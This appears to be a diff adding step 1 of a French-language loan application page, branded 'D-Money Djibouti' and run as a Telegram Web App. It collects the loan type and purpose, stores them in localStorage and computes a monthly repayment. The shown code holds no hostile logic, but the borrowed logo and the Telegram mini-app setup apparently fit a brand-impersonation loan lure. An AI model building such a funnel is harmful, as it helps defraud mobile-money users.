@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demande de Prêt - Étape 1</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(90deg, #5b2d8e 0%, #7c3aed 100%);
+            padding: 16px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .nav-header .back-btn-header {
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .dmoney-logo {
+            font-size: 22px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .dmoney-logo img {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        
+        .menu-icon {
+            font-size: 26px;
+            cursor: pointer;
+        }
+        
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 20px;
+            padding: 28px 20px;
+            border-radius: 14px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+        }
+        
+        h2 {
+            text-align: center;
+            font-size: 24px;
+            color: #222;
+            font-weight: 600;
+        }
+        
+        .step-info {
+            text-align: center;
+            font-size: 14px;
+            color: #999;
+            margin: 6px 0 22px;
+        }
+        
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+        
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e0e0e0;
+            border-radius: 2px;
+        }
+        
+        .bar.active-bar {
+            background: #7c3aed;
+        }
+        
+        .input-wrap {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        
+        select,
+        input,
+        textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.2s;
+        }
+        
+        select:focus,
+        textarea:focus {
+            border-color: #7c3aed;
+        }
+        
+        input[readonly] {
+            background: #f6f4fa;
+            color: #555;
+            cursor: not-allowed;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        
+        .btn-container {
+            margin-top: 28px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .back-btn {
+            background: #f1f1f1;
+            color: #777;
+            border: 1px solid #ddd;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .back-btn:active {
+            background: #e5e5e5;
+        }
+        
+        .next-btn {
+            background: linear-gradient(90deg, #5b2d8e 0%, #7c3aed 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: opacity 0.2s;
+        }
+        
+        .next-btn:active {
+            opacity: 0.85;
+        }
+        
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 32px;
+            padding-bottom: 24px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <div class="nav-header">
+        <div class="back-btn-header" onclick="goBack()">← Retour</div>
+        <div class="dmoney-logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="D-Money">
+            <span>D-Money</span>
+        </div>
+        <div class="menu-icon">☰</div>
+    </div>
+
+    <!-- Form Card -->
+    <div class="form-card">
+        <h2>Demande de Prêt</h2>
+        <p class="step-info">Étape 1 sur 3</p>
+
+        <!-- Progress -->
+        <div class="progress-box">
+            <div class="bar active-bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+
+        <!-- Loan Type -->
+        <div class="input-wrap">
+            <label for="loanType">Type de Prêt</label>
+            <select id="loanType">
+                <option value="Prêt Personnel" selected>Prêt Personnel</option>
+                <option value="Prêt Commercial">Prêt Commercial</option>
+                <option value="Prêt Automobile">Prêt Automobile</option>
+                <option value="Prêt Immobilier">Prêt Immobilier</option>
+                <option value="Prêt Étudiant">Prêt Étudiant</option>
+            </select>
+        </div>
+
+        <!-- Loan Amount (readonly — populated from localStorage) -->
+        <div class="input-wrap">
+            <label for="loanAmount">Montant du Prêt (DJF)</label>
+            <input type="text" id="loanAmount" readonly>
+        </div>
+
+        <!-- Loan Duration (readonly — populated from localStorage) -->
+        <div class="input-wrap">
+            <label for="loanDuration">Durée du Prêt</label>
+            <input type="text" id="loanDuration" readonly>
+        </div>
+
+        <!-- Loan Purpose -->
+        <div class="input-wrap">
+            <label for="loanPurpose">Motif du Prêt</label>
+            <textarea id="loanPurpose" rows="3" placeholder="Pourquoi avez-vous besoin de ce prêt ?"></textarea>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-container">
+            <button class="back-btn" onclick="goBack()">PRÉCÉDENT</button>
+            <button class="next-btn" onclick="goNext()">ÉTAPE SUIVANTE</button>
+        </div>
+    </div>
+
+    <div class="footer-text">© 2026 D-Money Djibouti</div>
+
+    <script>
+        // ---------- Format number with thousands separator ----------
+        function fmt(n) {
+            return Math.round(n).toLocaleString('fr-FR');
+        }
+
+        // ---------- Navigate back to index ----------
+        function goBack() {
+            window.location.href = "index.html";
+        }
+
+        // ---------- Save and go to page3 ----------
+        function goNext() {
+            const amountInput = document.getElementById('loanAmount');
+            const durationInput = document.getElementById('loanDuration');
+            const typeSelect = document.getElementById('loanType');
+            const purposeTextarea = document.getElementById('loanPurpose');
+
+            // Validate purpose
+            const purpose = purposeTextarea.value.trim();
+            if (!purpose) {
+                alert("Veuillez indiquer le motif du prêt.");
+                purposeTextarea.focus();
+                return;
+            }
+
+            const amount = amountInput.value || "0 DJF";
+            const durationRaw = durationInput.value || "0";
+
+            // Save form fields to localStorage
+            localStorage.setItem('loanAmount', amount);
+            localStorage.setItem('loanDuration', durationRaw);
+            localStorage.setItem('loanType', typeSelect.value);
+            localStorage.setItem('loanPurpose', purpose);
+
+            // Calculate monthly repayment: (amount * 1.18) / duration (in months)
+            const amtNum = parseFloat(amount.replace(/[^\d.]/g, '')) || 0;
+            const durNum = parseInt(durationRaw.replace(/\D/g, '')) || 1;
+            const monthly = fmt((amtNum * 1.18) / durNum);
+
+            // Save calculated values for page3
+            localStorage.setItem('loan_amount', String(amtNum));
+            localStorage.setItem('loan_term', String(durNum));
+            localStorage.setItem('monthly_repayment', monthly);
+
+            // Navigate to page3.html
+            window.location.href = "page3.html";
+        }
+
+        // ---------- On page load ----------
+        window.addEventListener('DOMContentLoaded', function() {
+            // Telegram integration
+            const tg = window.Telegram && window.Telegram.WebApp;
+            if (tg) {
+                tg.ready();
+                tg.expand();
+            }
+
+            // Populate readonly fields from localStorage (set by index.html)
+            const amountEl = document.getElementById('loanAmount');
+            const durationEl = document.getElementById('loanDuration');
+
+            const savedAmount = localStorage.getItem('amount');
+            const savedDuration = localStorage.getItem('loanDuration');
+
+            amountEl.value = savedAmount ? `${fmt(Number(savedAmount))} DJF` : "1 750 000 DJF";
+            durationEl.value = savedDuration || "12 Mois";
+        });
+    </script>
+
+</body>
+
+</html>
